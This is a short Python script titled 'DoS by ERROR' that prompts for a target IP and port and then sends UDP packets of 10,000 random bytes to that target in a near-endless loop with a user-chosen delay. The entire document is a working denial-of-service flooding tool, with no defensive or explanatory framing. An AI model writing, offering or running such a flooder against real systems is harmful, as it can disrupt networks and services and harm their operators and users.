#DoS by ERROR
from asyncio import sleep
import socket, random, time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter Target IP: ")
port = int(input("Enter Target port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

#print(random._unrandom(10)*1000)

for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)
